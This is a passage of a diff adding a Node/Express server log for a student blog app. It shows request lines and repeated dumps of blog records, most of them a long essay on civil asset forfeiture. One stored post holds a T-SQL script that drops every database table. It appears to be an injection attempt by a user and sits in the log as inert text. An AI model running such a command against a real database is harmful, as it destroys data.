wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 },
+  { _id: 5cbd9651bae1b279e4edd9fd,
+    blogTitle: 'Prof blog',
+    blogText: 'Test!',
+    userName: 'Thomas J Rogers',
+    userEmail: 'tjrtechgm@gmail.com',
+    createdOn: 2019-04-22T10:24:17.360Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.801 ms - 11035[0m
+Finding blog details { blogID: '5cbd9651bae1b279e4edd9fd' }
+{ _id: 5cbd9651bae1b279e4edd9fd,
+  blogTitle: 'Prof blog',
+  blogText: 'Test!',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com',
+  createdOn: 2019-04-22T10:24:17.360Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd9651bae1b279e4edd9fd [32m200 [0m1.838 ms - 187[0m
+Finding blog details { blogID: '5cbd9651bae1b279e4edd9fd' }
+{ _id: 5cbd9651bae1b279e4edd9fd,
+  blogTitle: 'Prof blog',
+  blogText: 'Test!',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com',
+  createdOn: 2019-04-22T10:24:17.360Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd9651bae1b279e4edd9fd [36m304 [0m3.928 ms - -[0m
+Blog ID 5cbd9651bae1b279e4edd9fd deleted
+[0mDELETE /api/blog/5cbd9651bae1b279e4edd9fd [32m204 [0m3.091 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m3.049 ms - 10852[0m
+[0mGET / [32m200 [0m0.463 ms - 7433[0m
+[0mGET / [32m200 [0m0.458 ms - 7433[0m
+[0mGET / [32m200 [0m0.455 ms - 7433[0m
+[0mGET / [32m200 [0m0.710 ms - 7433[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m0.556 ms - 19546[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.886 ms - 3884[0m
+[0mGET /blogApp.js [32m200 [0m0.901 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m0.483 ms - 756[0m
+[0mGET /nav/navigation.html [32m200 [0m0.604 ms - 693[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.829 ms - 10852[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m4.613 ms - -[0m
+[0mGET / [36m304 [0m0.345 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.292 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.260 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.251 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.300 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.446 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
